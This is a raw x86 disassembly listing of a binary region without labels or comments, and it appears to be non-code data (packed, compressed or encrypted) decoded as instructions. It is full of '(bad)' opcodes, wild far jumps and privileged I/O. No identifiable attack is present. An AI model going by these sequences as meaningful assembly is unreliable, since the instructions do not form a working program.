  49892e:	or     eax,0x4b9f8f3a
  498933:	pop    eax
  498934:	sahf   
  498935:	(bad)  
  498936:	addr16 out dx,al
  498938:	les    eax,FWORD PTR ss:[ecx]
  49893b:	mov    ch,0xad
  49893d:	(bad)  
  49893e:	shl    DWORD PTR [edi+0x19a41108],cl
  498944:	dec    edi
  498945:	aaa    
  498946:	shr    DWORD PTR [eax+0x5b],0x29
  49894a:	pop    ss
  49894b:	jg     0x498905
  49894d:	pusha  
  49894e:	mov    al,ds:0xc83407a9
  498953:	aad    0xd2
  498955:	bound  esp,QWORD PTR [edi]
  498957:	(bad)  
  498958:	xor    BYTE PTR [ebp-0x50b7ecba],ch
  49895e:	push   edi
  49895f:	adc    BYTE PTR [ecx+0x30d6774e],dh
  498965:	xor    BYTE PTR [eax],cl
  498967:	xor    BYTE PTR [ecx],ah
  498969:	xor    BYTE PTR [edi+0x28],al
  49896c:	jge    0x498909
  49896e:	push   ds
  49896f:	(bad)  
  498970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498971:	mov    bh,0x36
  498973:	rcl    DWORD PTR [edx+0xa473712],cl
  498979:	adc    al,0xeb
  49897b:	mov    bh,bh
  49897d:	inc    ecx
  49897e:	call   FWORD PTR [ecx-0x75]
  498981:	push   es
  498982:	call   0xc711:0x624ab007
  498989:	xlat   BYTE PTR ds:[ebx]
  49898a:	push   edx
  49898b:	sbb    dl,BYTE PTR [esp-0x6f6feca1]
  498992:	jle    0x5ae244cb
  498998:	(bad)  
  498999:	les    ebp,FWORD PTR [edi+0x711804a1]
  49899f:	out    0xf3,eax
  4989a1:	pop    edx
  4989a2:	aad    0xea
  4989a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4989a5:	iret   
  4989a6:	pop    ds
  4989a7:	adc    DWORD PTR [eax+0x3fd7136a],esi
  4989ad:	rol    BYTE PTR [esi+edi*4-0x2f7accee],0x1
  4989b5:	lods   eax,DWORD PTR ds:[esi]
  4989b6:	das    
  4989b7:	aaa    
  4989b8:	std    
  4989b9:	shr    BYTE PTR [edx+0x42df17a6],1
  4989bf:	nop
  4989c0:	push   edx
  4989c1:	pop    es
  4989c2:	add    DWORD PTR [edi],edx
  4989c4:	rcl    BYTE PTR [esi],0x83
  4989c7:	push   edx
  4989c8:	aaa    
  4989c9:	cli    
  4989ca:	out    0x2,eax
  4989cc:	push   edx
  4989cd:	and    esi,DWORD PTR [ebp+0x35]
  4989d0:	lahf   
  4989d1:	xor    dl,dh
  4989d3:	mov    ch,0x98
  4989d5:	jg     0x498a36
  4989d7:	push   ss
  4989d8:	sbb    edx,eax
  4989da:	sub    cl,BYTE PTR [edi+0x59a2615b]
  4989e0:	xchg   esi,eax
  4989e1:	dec    edi
  4989e2:	xor    bl,BYTE PTR [esi-0x30d7bfcb]
  4989e8:	xor    DWORD PTR [edi-0x583fec57],eax
  4989ee:	sub    eax,DWORD PTR [edi-0x7b0e4d73]
  4989f4:	inc    ecx
  4989f5:	push   edi
  4989f6:	jg     0x4989b9
  4989f8:	and    al,BYTE PTR [edx-0x7fc0e0fe]
  4989fe:	jne    0x498982
  498a00:	or     BYTE PTR [edi+0x58c53262],cl
  498a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498a07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498a08:	inc    ecx
  498a09:	add    esp,DWORD PTR [eax]
  498a0b:	inc    ebp
  498a0c:	inc    ebp
  498a0d:	xlat   BYTE PTR ds:[ebx]
  498a0e:	sbb    edx,DWORD PTR [ecx+0x30]
  498a11:	rol    BYTE PTR [edx+0xc378637],1
  498a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498a18:	pusha  
  498a19:	leave  
  498a1a:	cmp    DWORD PTR [edi],ecx
  498a1c:	inc    ebp
  498a1d:	and    eax,0x44ffaa39
  498a22:	inc    edx
  498a23:	sub    DWORD PTR [esi-0x290078e6],esi
  498a29:	ss cdq 
  498a2b:	mov    dh,0xa7
  498a2d:	out    0x41,eax
  498a2f:	fild   QWORD PTR [esi+0x5f98a118]
  498a35:	jg     0x498a6b
  498a37:	stos   DWORD PTR es:[edi],eax
  498a38:	inc    ecx
  498a39:	jmp    0xab191960
  498a3e:	lds    ecx,FWORD PTR ds:0xaa0f5f53
  498a44:	pop    ecx
  498a45:	and    al,0x86
  498a47:	cmp    bh,dh
  498a49:	pusha  
  498a4a:	adc    eax,0xba4f40c9
  498a4f:	pushw  0x7f51
  498a53:	pop    ds
  498a54:	xor    edx,DWORD PTR [eax]
  498a56:	sbb    DWORD PTR [ecx-0x71e898f5],esp
  498a5c:	push   esp
  498a5d:	mov    eax,ds:0xfbf3170
  498a62:	shl    BYTE PTR [edx+0x31],0x5d
  498a66:	into   
  498a67:	cmovb  esi,DWORD PTR [eax]
  498a6a:	add    BYTE PTR [ebx+0x708f3f58],ah
  498a70:	adc    eax,0x38ef584b
  498a75:	adc    DWORD PTR [eax-0x7c],ecx
  498a78:	push   es
  498a79:	out    0x7,eax
  498a7b:	gs pop esp
  498a7d:	lods   eax,DWORD PTR ds:[esi]
  498a7e:	(bad)  
  498a7f:	pop    ds
  498a80:	mov    edi,0x5a12b100
  498a85:	scas   eax,DWORD PTR es:[edi]
  498a86:	adc    ecx,DWORD PTR cs:[eax+0x5d]
  498a8a:	pop    ds
  498a8b:	dec    edi
  498a8c:	push   ecx
  498a8d:	rcr    BYTE PTR [eax],cl
  498a8f:	sub    edx,DWORD PTR [edx-0x73]
  498a92:	xor    BYTE PTR [ebp+0x51],dh
  498a95:	xchg   DWORD PTR [ebx-0x49],eax
  498a98:	popa   
  498a99:	mov    WORD PTR [eax+0x4a],ds
  498a9c:	xchg   edx,ebp
  498a9e:	add    bl,BYTE PTR [eax-0x49]
  498aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498aa2:	fild   QWORD PTR [esi-0x18c9cfe8]
  498aa8:	scas   eax,DWORD PTR es:[edi]
  498aa9:	ss sub al,0x12
  498aac:	inc    esp
  498aad:	xor    BYTE PTR [edi],dh
  498aaf:	scas   eax,DWORD PTR es:[edi]
  498ab0:	and    al,0xa
  498ab2:	add    ecx,DWORD PTR [ebx]
  498ab4:	dec    ebx
  498ab5:	pop    ds
  498ab6:	test   al,0x69
  498ab8:	or     eax,0x4b974f06
  498abd:	xchg   ecx,eax
  498abe:	jno    0x498a71
  498ac0:	pop    ss
  498ac1:	iret   
  498ac2:	lahf   
  498ac3:	push   0x18
  498ac5:	mov    ds:0x5a47e75a,eax
  498aca:	or     eax,0x997b024
  498acf:	jge    0x498b24
  498ad1:	sub    esi,edi
  498ad3:	pop    ss
  498ad4:	mov    edx,0xffd5a952
  498ad9:	(bad)  
  498ada:	punpcklbw mm4,DWORD PTR [ecx]
  498add:	pop    es
  498ade:	(bad)  
  498adf:	pop    ss
  498ae0:	xor    al,BYTE PTR [edx+ecx*1]
  498ae3:	mov    ebp,DWORD PTR [ebp+0x1700ef4f]
  498ae9:	(bad)  
  498aea:	shr    edi,1
  498aec:	inc    ecx
  498aed:	das    
  498aee:	inc    ebp
  498aef:	jne    0x498afc
  498af1:	cs push ecx
  498af3:	ja     0x498b58
  498af5:	das    
  498af6:	sub    eax,0xdf8ca562
  498afb:	mov    eax,ds:0x579ab056
  498b00:	addr16 push cs
  498b02:	cdq    
  498b03:	and    eax,0xefef8018
  498b08:	cmp    DWORD PTR [ebx+eiz*4],eax
  498b0b:	test   BYTE PTR [ebx],cl
  498b0d:	xor    eax,DWORD PTR [edi]
  498b0f:	add    al,0x2c
  498b11:	xchg   esi,eax
  498b12:	mov    eax,ds:0xba22ecb3
  498b17:	sbb    ah,BYTE PTR [edi-0x58bc10ca]
  498b1d:	add    al,0x91
  498b1f:	inc    eax
  498b20:	pop    esp
  498b21:	aaa    
  498b22:	xadd   BYTE PTR ds:0x39bf80b1,al
  498b29:	bound  edx,QWORD PTR ds:0xff9b9748
  498b2f:	sub    dl,BYTE PTR [esi+0x4317a388]
  498b35:	mov    edi,0x40c5a527
  498b3a:	ret    
  498b3b:	xlat   BYTE PTR ds:[ebx]
  498b3c:	mov    al,0x8a
  498b3e:	sub    al,0x63
  498b40:	movntps XMMWORD PTR [esi-0x53],xmm4
  498b44:	stos   BYTE PTR es:[edi],al
  498b45:	xchg   DWORD PTR [edi-0x7e],esi
  498b48:	test   al,0x83
  498b4a:	adc    dl,BYTE PTR [edi-0x28e8dbbc]
  498b50:	push   0x47
  498b52:	pop    ss
  498b53:	inc    esi
  498b54:	or     eax,0x3977aea4
  498b59:	stos   DWORD PTR es:[edi],eax
  498b5a:	pop    ss
  498b5b:	adc    ecx,DWORD PTR ds:0xe3f73a2d
  498b61:	push   ecx
  498b62:	jmp    0x60a7:0xbb1762ad
  498b69:	xor    eax,0x3f2f6bb1
  498b6e:	adc    BYTE PTR [eax-0x73e8d3e8],dl
  498b74:	outs   dx,BYTE PTR ds:[esi]
  498b75:	or     ebp,DWORD PTR [ebx+0x5f]
  498b78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498b79:	aad    0xb0
  498b7b:	and    DWORD PTR [ecx+0x27],esi
  498b7e:	pop    ss
  498b7f:	jg     0x498b05
  498b81:	cmp    DWORD PTR [eax],edi
  498b83:	lods   eax,DWORD PTR ds:[esi]
  498b84:	push   DWORD PTR [esi]
  498b86:	mov    eax,0x37cd6120
  498b8b:	outs   dx,DWORD PTR ds:[esi]
  498b8c:	adc    esp,DWORD PTR [ecx-0x50bc47ad]
  498b92:	or     BYTE PTR [esp+ebp*1+0x37],al
  498b96:	xchg   edi,eax
  498b97:	inc    ebp
  498b98:	mov    edi,0x86b14811
  498b9d:	inc    ebp
  498b9e:	dec    edi
  498b9f:	loopne 0x498be3
  498ba1:	and    al,0xdb
  498ba4:	pop    es
  498ba5:	dec    edi
  498ba6:	loope  0x498bde
  498ba8:	enter  0x4fc2,0x27
  498bac:	sbb    eax,0x470b4701
  498bb1:	pop    edi
  498bb2:	pop    es
  498bb3:	rcr    DWORD PTR [esi-0x2cb0b14f],1
  498bb9:	scas   eax,DWORD PTR es:[edi]
  498bba:	mov    ch,0xaa
  498bbc:	mov    eax,ds:0x6978783
  498bc1:	adc    DWORD PTR [ebp+0x20afaf3a],0xffffff8d
  498bc8:	enter  0x67b2,0x35
  498bcc:	imul   ebx,DWORD PTR [edi+eiz*1+0x37],0x5680df38
  498bd4:	sub    al,BYTE PTR [ecx]
  498bd6:	outs   dx,DWORD PTR ds:[esi]
  498bd7:	xor    eax,DWORD PTR [eax+0x440798ab]
  498bdd:	jg     0x498ba9
  498bdf:	push   eax
  498be0:	sub    ah,al
  498be2:	lahf   
  498be3:	nop
  498be4:	and    DWORD PTR [ebx+0x71],0x1a44d74f
  498beb:	xor    eax,0x2f9fb038
  498bf0:	in     al,0x62
  498bf2:	pop    eax
  498bf3:	aad    0x27
  498bf5:	pop    DWORD PTR [ebx+0x56]
  498bf8:	ins    BYTE PTR es:[edi],dx
  498bf9:	mov    dh,0x34
  498bfb:	scas   eax,DWORD PTR es:[edi]
  498bfc:	addr16 test al,0x34
  498bff:	xor    cl,bh
  498c01:	jg     0x498c38
  498c03:	out    0xab,eax
  498c05:	test   eax,0xe763d0dd
  498c0a:	ror    DWORD PTR [edx+0x4f676d4d],0x5f
  498c11:	sbb    dl,BYTE PTR [esi]
  498c13:	and    DWORD PTR [edi+0x45],eax
  498c16:	iret   
  498c17:	adc    eax,0x27c2d560
  498c1c:	pop    es
  498c1d:	in     al,0x68
  498c1f:	mov    dh,0x8c
  498c21:	scas   eax,DWORD PTR es:[edi]
  498c22:	inc    edx
  498c23:	mov    ebp,0x4506454b
  498c28:	scas   eax,DWORD PTR es:[edi]
  498c29:	(bad)  
  498c2a:	mov    ebx,0xdf8b18b5
  498c2f:	iret   
  498c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498c31:	push   ebx
  498c32:	xchg   esp,eax
  498c33:	push   ss
  498c34:	pop    ecx
  498c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  498c36:	mov    eax,ds:0xb7ab1915
  498c3b:	xlat   BYTE PTR ds:[ebx]
  498c3c:	mov    bh,0x46
  498c3e:	sub    al,0x1a
  498c40:	cmovg  ebp,DWORD PTR [edi+0x21]
  498c44:	jmp    0x5ee8ae1f
  498c49:	stos   DWORD PTR es:[edi],eax
  498c4a:	call   0xd756:0x4f47d6a2
  498c51:	dec    ax
  498c53:	mov    edi,0x508458b7
  498c58:	mov    ah,BYTE PTR [edi]
  498c5a:	mov    edi,0x8a757181
  498c5f:	addr16 inc ebp
  498c61:	pop    ebx
  498c62:	retf   
  498c63:	inc    esi
  498c64:	mov    ds:0x8867df6d,al
  498c69:	add    ah,BYTE PTR [esi-0x28615c12]
  498c6f:	and    BYTE PTR [edi+0x5a],dl
  498c72:	push   edx
  498c73:	aas    
  498c74:	xor    al,0x6a
  498c76:	adc    DWORD PTR [edx+0x4a],edx
  498c79:	pop    es
  498c7a:	mov    BYTE PTR [ebp-0x18d0f32f],cl
  498c80:	aad    0xb4
  498c82:	push   cs
  498c83:	mov    al,0x43
  498c85:	je     0x3fa1cd14
  498c8b:	xor    al,BYTE PTR [esi-0x30df1def]
  498c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498c92:	jne    0x498ce7
  498c94:	sub    esi,DWORD PTR [edi+0x4615c19f]
  498c9a:	adc    edx,edi
  498c9c:	fbld   TBYTE PTR [esp+eiz*4+0x42e6d282]
  498ca4:	push   ss
  498ca5:	call   0x70096de
  498caa:	iret   
  498cab:	lea    esi,[edx-0x70f74c]
  498cb1:	adc    BYTE PTR [ecx+0x15a75a5d],ch
  498cb7:	push   ecx
  498cb8:	(bad)  
  498cb9:	stos   BYTE PTR es:[edi],al
  498cba:	lahf   
  498cbb:	(bad)  
  498cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  498cbd:	jne    0x498cc2
  498cbf:	(bad)  
  498cc0:	out    0x97,al
  498cc2:	sbb    eax,0xc7015624
  498cc7:	iret   
  498cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  498cc9:	dec    ebx
  498cca:	stos   DWORD PTR es:[edi],eax
  498ccb:	or     ch,bh
  498ccd:	aas    
  498cce:	xor    eax,0x16055808
  498cd3:	(bad)  
  498cd4:	je     0x498d4a
  498cd6:	lods   al,BYTE PTR ds:[esi]
  498cd7:	inc    esi
  498cd8:	fist   WORD PTR [edi+0x45]
  498cdb:	lods   al,BYTE PTR ds:[esi]
  498cdc:	inc    edx
  498cdd:	adc    ebp,DWORD PTR [ebx]
  498cdf:	aaa    
  498ce0:	das    
  498ce1:	call   0x730:0x4f572163
  498ce8:	xor    ebx,DWORD PTR [ebp+0x4f42110b]
  498cee:	jg     0x498d26
  498cf0:	adc    esi,eax
  498cf2:	or     ch,BYTE PTR [ecx-0x19]
  498cf5:	push   0x37ac7461
  498cfa:	div    DWORD PTR [ecx-0x448bd7d0]
  498d00:	(bad)  
  498d01:	cmp    esi,DWORD PTR [edx+ebx*4-0x7dd09ce0]
  498d08:	mov    edx,0x420f80e0
  498d0d:	inc    esp
  498d0e:	lea    ebp,[ecx]
  498d10:	push   es
  498d11:	jg     0x498d57
  498d13:	mov    bh,0x2
  498d15:	mov    bh,0x9a
  498d17:	mov    BYTE PTR [edi+0x40200f43],bl
  498d1d:	test   eax,0xcea0efd6
  498d22:	sbb    BYTE PTR [eax+0x77],dl
  498d25:	xchg   bl,ch
  498d27:	xor    BYTE PTR [esi],dl
  498d29:	dec    esp
  498d2a:	pop    edi
  498d2b:	iret   
  498d2c:	dec    ebp
  498d2d:	or     al,0x2c
  498d2f:	jo     0x498da0
  498d31:	jg     0x498da6
  498d33:	xor    BYTE PTR ds:0xb7641503,ah
  498d39:	xor    eax,edx
  498d3b:	pop    eax
  498d3c:	and    DWORD PTR [ebx],ebp
  498d3e:	outs   dx,DWORD PTR ds:[esi]
  498d3f:	mov    ch,0x4c
  498d41:	or     eax,0x4aff1f4e
  498d46:	rcr    BYTE PTR [edx],0x6
  498d49:	(bad)  
  498d4a:	(bad)  
  498d4b:	add    BYTE PTR [edx],ah
  498d4d:	push   esp
  498d4e:	outs   dx,DWORD PTR ds:[esi]
  498d4f:	pop    es
  498d50:	dec    ebx
  498d51:	mov    cs,WORD PTR [eax+0x4c33a714]
  498d57:	sub    al,0x14
  498d59:	sbb    bh,al
  498d5b:	lahf   
  498d5c:	inc    ecx
  498d5d:	pop    edx
  498d5e:	or     eax,0x2b27b504
  498d63:	mov    ecx,0x33cf090e
  498d68:	add    al,0x29
  498d6a:	push   ebp
  498d6b:	inc    eax
  498d6c:	aas    
  498d6d:	mov    DWORD PTR [ecx-0x281829ec],eax
  498d73:	xchg   esi,eax
  498d74:	nop
  498d75:	inc    edx
  498d76:	adc    DWORD PTR [esi-0x78e9c0cc],eax
  498d7c:	inc    esp
  498d7d:	and    eax,0x528b51e7
  498d82:	add    BYTE PTR [edi-0x5b],ch
  498d85:	ins    DWORD PTR es:[edi],dx
  498d86:	inc    eax
  498d87:	or     DWORD PTR [edi-0x6a97f6b9],edi
  498d8d:	sbb    dh,bh
  498d8f:	outs   dx,BYTE PTR ds:[esi]
  498d90:	xchg   BYTE PTR [edx],al
  498d92:	inc    eax
  498d93:	fdiv   st,st(7)
  498d95:	aas    
  498d96:	xor    al,0x69
  498d98:	mov    eax,ds:0x3fcf1498
  498d9d:	mov    ebp,eax
  498d9f:	pusha  
  498da0:	sbb    edi,ecx
  498da2:	xor    al,0x6
  498da4:	xchg   DWORD PTR [ecx-0x51],esi
  498da7:	lahf   
  498da8:	nop
  498da9:	nop
  498daa:	mov    eax,DWORD PTR [ecx]
  498dac:	xlat   BYTE PTR ds:[ebx]
  498dad:	xor    BYTE PTR [eax],bl
  498daf:	pop    edx
  498db0:	rcr    DWORD PTR [edx],cl
  498db2:	inc    edi
  498db3:	inc    edi
  498db4:	int    0x36
  498db6:	mov    cl,0x22
  498db8:	xor    eax,DWORD PTR [edi+0x4c5462cb]
  498dbe:	xor    eax,0xda98773f
  498dc3:	or     dh,BYTE PTR [eax+0x324f572f]
  498dc9:	inc    ebp
  498dca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498dcb:	xor    al,0xdb
  498dcd:	xchg   edi,eax
  498dce:	div    esp
  498dd0:	push   es
  498dd1:	adc    esp,DWORD PTR [ecx+0x1a814ff7]
  498dd7:	loop   0x498e0f
  498dd9:	test   DWORD PTR [edx+0x72],0xe7069131
  498de0:	push   DWORD PTR [ebx]
  498de2:	dec    esp
  498de3:	push   esp
  498de4:	dec    eax
  498de5:	(bad)  
  498de6:	ja     0x498e2b
  498de8:	adc    dl,BYTE PTR [esi+0x37]
  498deb:	ins    BYTE PTR es:[edi],dx
  498dec:	das    
  498ded:	jns    0x498e1a
  498def:	cdq    
  498df0:	add    edi,ecx
  498df2:	ss cs xor al,0xb4
  498df6:	call   0xbaa:0x2f4b00d1
  498dfd:	rcr    bl,0x7b
  498e00:	das    
  498e01:	lahf   
  498e02:	push   0xffffffa9
  498e04:	rcl    ah,0x37
  498e07:	(bad)  
  498e09:	ss retf 0x2754
  498e0d:	das    
  498e0e:	or     BYTE PTR [esi],cl
  498e10:	nop
  498e11:	retf   
  498e12:	xor    BYTE PTR [ebx],dh
  498e14:	cmp    BYTE PTR [edi],cl
  498e16:	ret    0x5368
  498e19:	mov    al,0x3f
  498e1b:	aaa    
  498e1c:	das    
  498e1d:	adc    DWORD PTR [eax],ebx
  498e1f:	push   eax
  498e20:	cwde   
  498e21:	iret   
  498e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  498e23:	or     DWORD PTR [edi-0x74],0x4f
  498e27:	pop    ebx
  498e28:	jg     0x498e58
  498e2a:	aad    0x6
  498e2c:	scas   al,BYTE PTR es:[edi]
  498e2d:	xlat   BYTE PTR ds:[ebx]
  498e2e:	das    
  498e2f:	sub    eax,DWORD PTR [ecx+ecx*4]
  498e32:	pusha  
  498e33:	mov    cl,0x43
  498e35:	add    ebp,DWORD PTR [edi-0x61]
  498e38:	pop    eax
  498e39:	shl    DWORD PTR [edx+0x13],0x34
  498e3d:	das    
  498e3e:	pop    es
  498e3f:	test   DWORD PTR [ebp+edx*2+0x1e77bf6d],edi
  498e46:	cmp    BYTE PTR [edx+0x4f],ah
  498e49:	imul   ebp,DWORD PTR [edi+0x1f2b1fc6],0x21
  498e50:	adc    ebx,DWORD PTR [ebx-0x14]
  498e53:	xor    eax,0xdd431f7f
  498e58:	test   BYTE PTR [esi+0x75],dl
  498e5b:	xor    BYTE PTR [edi],dh
  498e5d:	mov    bh,0x62
  498e5f:	pop    ss
  498e60:	xor    dh,BYTE PTR [ecx-0x20c8c981]
  498e66:	les    eax,FWORD PTR [edx+0x5b]
  498e69:	in     al,dx
  498e6a:	xor    al,0x1f
  498e6c:	jg     0x498e8d
  498e6e:	and    dl,BYTE PTR [ebx-0x60bc37a8]
  498e74:	and    al,0x7
  498e76:	mov    ebp,DWORD PTR ds:0x85347e9f
  498e7c:	pop    esp
  498e7d:	enter  0xfe0b,0x32
  498e81:	xor    eax,edx
  498e83:	test   DWORD PTR [eax+ecx*8+0x31],ebx
  498e87:	xor    DWORD PTR [edx],esi
  498e89:	and    al,0x3
  498e8b:	inc    ecx
  498e8c:	push   0xffffffcf
  498e8e:	jg     0x498ec2
  498e90:	push   edx
  498e91:	aaa    
  498e92:	inc    ebp
  498e93:	sbb    al,0x34
  498e95:	dec    edi
  498e96:	xchg   esi,eax
  498e97:	pop    esp
  498e98:	enter  0x1fc0,0x38
  498e9c:	inc    ebx
  498e9d:	inc    esi
  498e9e:	(bad)  
  498e9f:	pop    edx
  498ea0:	cwde   
  498ea1:	outs   dx,DWORD PTR ds:[esi]
  498ea2:	pop    ds
  498ea3:	pop    ds
  498ea4:	test   DWORD PTR [eax],ecx
  498ea6:	push   ds
  498ea7:	adc    ah,BYTE PTR [edx+0x7f]
  498eaa:	and    DWORD PTR [ebx],edx
  498eac:	pop    ebx
  498ead:	sub    eax,0xc244ff07
  498eb2:	test   DWORD PTR [esp+ebp*2+0x1f],ecx
  498eb6:	inc    ebx
  498eb7:	xor    BYTE PTR [edx],dl
  498eb9:	mov    DWORD PTR [ecx],ecx
  498ebb:	imul   eax,DWORD PTR [edi],0x6f
  498ebe:	enter  0x442c,0xb0
  498ec2:	aaa    
  498ec3:	jg     0x498ec4
  498ec5:	inc    ebx
  498ec6:	pop    esp
  498ec7:	enter  0x5c85,0x42
  498ecb:	inc    edx
  498ecc:	inc    edx
  498ecd:	test   DWORD PTR [ecx],eax
  498ecf:	ret    
  498ed0:	test   DWORD PTR [ebx-0x61],eax
  498ed3:	mov    bh,0xa
  498ed5:	push   esi
  498ed6:	xchg   edi,eax
  498ed7:	mov    edi,0xb90fe7f
  498edc:	mov    ecx,0x39394190
  498ee1:	inc    eax
  498ee2:	push   0x7f39b90b
  498ee7:	add    al,BYTE PTR ds:0x7f570ba3
  498eed:	ins    BYTE PTR es:[edi],dx
  498eee:	and    DWORD PTR [edi],edx
  498ef0:	sar    dh,cl
  498ef2:	cmp    BYTE PTR [edi],dh
  498ef4:	pop    ds
  498ef5:	cmp    dl,bl
  498ef7:	test   DWORD PTR [ebx+eax*2+0x30],ecx
  498efb:	jg     0x498f40
  498efd:	or     eax,0x1fe231c0
  498f02:	jg     0x498f38
  498f04:	or     edi,DWORD PTR [ecx+0x381f8b90]
  498f0a:	inc    ebx
  498f0b:	adc    ch,0xb0
  498f0e:	adc    DWORD PTR [edi-0x22f4ce61],edi
  498f14:	adc    BYTE PTR [edi],dl
  498f16:	push   edi
  498f17:	inc    edx
  498f18:	dec    ebp
  498f19:	or     eax,DWORD PTR [esi+0x40]
  498f1c:	(bad)  
  498f1e:	jg     0x498f62
  498f20:	push   ecx
  498f21:	sub    dl,BYTE PTR [esi+0x17]
  498f24:	jmp    FWORD PTR [esi]
  498f26:	in     al,0x42
  498f28:	or     bl,BYTE PTR [esi]
  498f2a:	xor    dh,BYTE PTR [edx]
  498f2c:	xor    al,ch
  498f2e:	cs in  al,0x42
  498f31:	xor    dh,BYTE PTR [ebx]
  498f33:	pop    edi
  498f34:	sbb    BYTE PTR [esp+ebx*2-0x38],dh
  498f38:	inc    ecx
  498f39:	inc    ecx
  498f3a:	pop    ds
  498f3b:	inc    edx
  498f3c:	cs fs pusha 
  498f3f:	push   DWORD PTR [eax]
  498f41:	xor    BYTE PTR [esi],dh
  498f43:	inc    eax
  498f44:	cs in  al,0x30
  498f47:	xor    BYTE PTR [edi],bl
  498f49:	inc    ebx
  498f4a:	mov    DWORD PTR [edx+0x26],0xbb451f38
  498f51:	dec    eax
  498f52:	push   0x5
  498f54:	aas    
  498f55:	scas   eax,DWORD PTR es:[edi]
  498f56:	and    BYTE PTR [esi],al
  498f58:	xor    bl,BYTE PTR [ebp+0x3b]
  498f5b:	xor    esi,edx
  498f5d:	mov    dh,0xb5
  498f5f:	aad    0x77
  498f61:	pop    ds
  498f62:	or     edi,DWORD PTR [edi+0x45]
  498f65:	pop    edx
  498f66:	enter  0x1fc5,0x38
  498f6a:	out    0x19,eax
  498f6c:	sbb    BYTE PTR [esi+0x61],dh
  498f6f:	lahf   
  498f70:	mov    edi,0xeaa30546
  498f75:	sub    eax,0x5f5fbf5f
  498f7a:	rol    BYTE PTR [ebp+0x34],0x32
  498f7e:	xor    DWORD PTR [edi],0xffffffbf
  498f81:	sbb    DWORD PTR [ebx+0x461f60e3],ecx
  498f87:	jg     0x498f8e
  498f89:	imul   ebp,DWORD PTR [ebx-0x60e8b9a8],0x5f
  498f90:	mov    dl,BYTE PTR [esi]
  498f92:	jb     0x498f45
  498f94:	pop    ds
  498f95:	inc    ebx
  498f96:	jg     0x498f1d
  498f98:	pop    esp
  498f99:	and    al,0xdf
  498f9b:	pop    ds
  498f9c:	xor    al,0x38
  498f9e:	cdq    
  498f9f:	lea    edx,[eax-0xbde172]
  498fa5:	cmp    BYTE PTR [ebx],cl
  498fa7:	mov    ecx,0x39380b90
  498fac:	inc    edx
  498fad:	cs bound ebx,QWORD PTR fs:[edi]
  498fb1:	cmp    BYTE PTR [ebx-0x54],al
  498fb4:	dec    eax
  498fb5:	sub    eax,eax
  498fb7:	pop    edi
  498fb8:	out    0x62,eax
  498fba:	pop    eax
  498fbb:	enter  0xdf31,0x46
  498fbf:	call   DWORD PTR [eax-0x212df58c]
  498fc5:	inc    ebp
  498fc6:	in     al,0x42
  498fc8:	cmp    BYTE PTR es:[edi+0x37],0x37
  498fcd:	fcmovb st,st(4)
  498fcf:	inc    edx
  498fd0:	cmp    BYTE PTR cs:[edx+0x2e],al
  498fd4:	jbe    0x499007
  498fd6:	mov    bh,0x33
  498fd8:	lahf   
  498fd9:	xor    ebx,eax
  498fdb:	inc    edx
  498fdc:	cs in  al,0x33
  498fdf:	xor    al,0x1f
  498fe1:	mov    ah,0x90
  498fe3:	or     ebx,DWORD PTR [ecx+0x1d8b4338]
  498fe9:	dec    ebp
  498fea:	xor    BYTE PTR [edi+0xba67f32],ah
  498ff0:	mov    ecx,0x33323290
  498ff5:	pop    edi
  498ff6:	jmp    0x3f7f:0x342ed11a
  498ffd:	mov    ecx,0xefc6058e
  499002:	pop    ds
  499003:	xor    BYTE PTR [ebx],cl
  499005:	mov    ecx,0x31310b90
  49900a:	nop
  49900b:	or     edi,DWORD PTR [ecx+0x32313190]
  499011:	jb     0x499034
  499013:	jae    0x498fa2
  499015:	fbstp  TBYTE PTR [ebx]
  499017:	xor    eax,0x17547217
  49901c:	xor    al,0xff
  49901e:	inc    ebp
  49901f:	inc    ebp
  499020:	or     edi,DWORD PTR [ecx+0x70]
  499023:	and    DWORD PTR [ebp+0x7f],eax
  499026:	inc    esi
  499027:	lock push edx
  499029:	mov    al,0x90
  49902b:	xor    BYTE PTR [edi],al
  49902d:	jg     0x49903d
  49902f:	fisubr DWORD PTR [ebp+eax*2-0x1]
  499033:	fild   WORD PTR [edi+ebx*1+0x38]
  499037:	loopne 0x499066
  499039:	in     al,0x42
  49903b:	inc    ebx
  49903c:	or     ebp,DWORD PTR [edx+0x5f3589c4]
  499042:	lahf   
  499043:	call   ecx
  499045:	fiadd  WORD PTR [edx+0x6]
  499048:	inc    ebp
  499049:	fistp  WORD PTR [edi]
  49904b:	pop    ss
  49904c:	rcl    BYTE PTR [esi],cl
  49904e:	jb     0x499088
  499050:	sahf   
  499051:	inc    edx
  499052:	inc    ebx
  499053:	pusha  
  499054:	les    esi,FWORD PTR [ecx+0x21]
  499057:	inc    ebx
  499058:	pop    ds
  499059:	mov    ecx,0x7fa85990
  49905e:	fistp  QWORD PTR [ecx]
  499060:	cmp    DWORD PTR [esi],esp
  499062:	mov    dh,0x90
  499064:	or     eax,DWORD PTR [ecx+0x1f]
  499067:	cmp    ah,ah
  499069:	pop    ebx
  49906a:	rol    DWORD PTR [edx+0x7],0xff
  49906e:	aaa    
  49906f:	xor    DWORD PTR [edx],esp
  499071:	pop    eax
  499072:	sub    eax,0x90397ffe
  499077:	retf   
  499078:	push   eax
  499079:	jg     0x4990c0
  49907b:	inc    ebx
  49907c:	xor    BYTE PTR [ebp+0x3],dl
  49907f:	(bad)  
  499080:	sub    bl,BYTE PTR [edi]
  499082:	inc    ebx
  499083:	lahf   
  499084:	push   ss
  499085:	rol    DWORD PTR [ecx+0x1f35361c],1
  49908b:	(bad)  
  49908c:	loop   0x4990a8
  49908e:	call   0x7b16:0xa5ff327f
  499095:	sub    edi,DWORD PTR [edi]
  499097:	call   FWORD PTR [edi-0x3e9f66ae]
